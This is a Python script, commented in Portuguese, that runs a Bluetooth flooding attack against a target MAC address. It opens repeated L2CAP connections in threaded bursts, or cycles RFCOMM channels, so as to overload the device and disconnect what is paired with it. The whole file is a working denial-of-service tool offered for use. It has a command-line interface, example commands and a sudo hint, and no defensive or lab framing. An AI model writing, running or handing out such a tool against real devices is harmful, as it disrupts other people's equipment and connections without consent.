#!/usr/bin/env python3
"""
Script de Flooding Bluetooth - Sobrecarrega o dispositivo com requisições
Pode causar desconexão de dispositivos conectados
"""

import bluetooth
import sys
import time
import threading
import argparse
from socket import *

def l2cap_flood(target_mac, port=0x1001, duration=30):
    """
    Envia múltiplas requisições L2CAP para sobrecarregar o dispositivo
    
    Args:
        target_mac: Endereço MAC do dispositivo alvo
        port: Porta L2CAP (padrão: 0x1001)
        duration: Duração do ataque em segundos
    """
    print(f"[*] Iniciando flooding L2CAP em {target_mac}")
    print(f"[*] Porta: {hex(port)}")
    print(f"[*] Duração: {duration} segundos")
    print("[*] Pressione Ctrl+C para parar\n")
    
    connections = []
    start_time = time.time()
    request_count = 0
    
    def create_connection():
        nonlocal request_count
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(1)
            sock.connect((target_mac, port))
            connections.append(sock)
            request_count += 1
            if request_count % 10 == 0:
                print(f"[+] {request_count} requisições enviadas...")
        except Exception:
            # Falha esperada - continuar enviando
            request_count += 1
            pass
    
    try:
        while time.time() - start_time < duration:
            # Criar múltiplas threads para conexões simultâneas
            threads = []
            for _ in range(5):  # 5 conexões simultâneas
                t = threading.Thread(target=create_connection)
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Aguardar um pouco antes da próxima onda
            time.sleep(0.1)
            
            # Limpar conexões antigas
            for sock in connections[:]:
                try:
                    sock.close()
                except:
                    pass
            connections.clear()
            
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo usuário")
    
    finally:
        # Fechar todas as conexões
        for sock in connections:
            try:
                sock.close()
            except:
                pass
        
        print(f"\n[+] Ataque concluído: {request_count} requisições enviadas")
        print("[+] Verifique se o dispositivo foi desconectado")

def rfcomm_flood(target_mac, duration=30):
    """
    Flooding usando RFCOMM (canal serial Bluetooth)
    """
    print(f"[*] Iniciando flooding RFCOMM em {target_mac}")
    print(f"[*] Duração: {duration} segundos\n")
    
    start_time = time.time()
    request_count = 0
    
    try:
        while time.time() - start_time < duration:
            try:
                sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                sock.settimeout(0.5)
                # Tentar conectar em diferentes canais
                for channel in range(1, 31):
                    try:
                        sock.connect((target_mac, channel))
                        request_count += 1
                        sock.close()
                        break
                    except:
                        continue
                
                if request_count % 10 == 0:
                    print(f"[+] {request_count} tentativas de conexão RFCOMM...")
                    
            except Exception:
                request_count += 1
                time.sleep(0.1)
                
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido")
    
    print(f"\n[+] Ataque concluído: {request_count} tentativas")

def main():
    parser = argparse.ArgumentParser(
        description='Ataque de Flooding Bluetooth para desconectar dispositivos',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  python3 bluetooth_flood.py --target AA:BB:CC:DD:EE:FF
  python3 bluetooth_flood.py --target AA:BB:CC:DD:EE:FF --method rfcomm --duration 60
        """
    )
    
    parser.add_argument(
        '--target', '-t',
        required=True,
        help='Endereço MAC do dispositivo alvo (ex: AA:BB:CC:DD:EE:FF)'
    )
    
    parser.add_argument(
        '--method', '-m',
        choices=['l2cap', 'rfcomm'],
        default='l2cap',
        help='Método de flooding (padrão: l2cap)'
    )
    
    parser.add_argument(
        '--duration', '-d',
        type=int,
        default=30,
        help='Duração do ataque em segundos (padrão: 30)'
    )
    
    args = parser.parse_args()
    
    # Validar formato do MAC
    mac = args.target.upper().replace('-', ':')
    if len(mac) != 17 or mac.count(':') != 5:
        print("[!] Erro: Formato de MAC inválido")
        print("[!] Use o formato: AA:BB:CC:DD:EE:FF")
        sys.exit(1)
    
    print("=" * 60)
    print("    ATAQUE DE FLOODING BLUETOOTH")
    print("=" * 60)
    print()
    print(f"[*] Alvo: {mac}")
    print(f"[*] Método: {args.method.upper()}")
    print()
    
    try:
        if args.method == 'l2cap':
            l2cap_flood(mac, duration=args.duration)
        else:
            rfcomm_flood(mac, duration=args.duration)
            
    except PermissionError:
        print("[!] Erro: Permissões insuficientes")
        print("[!] Tente executar com sudo: sudo python3 bluetooth_flood.py ...")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Erro: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

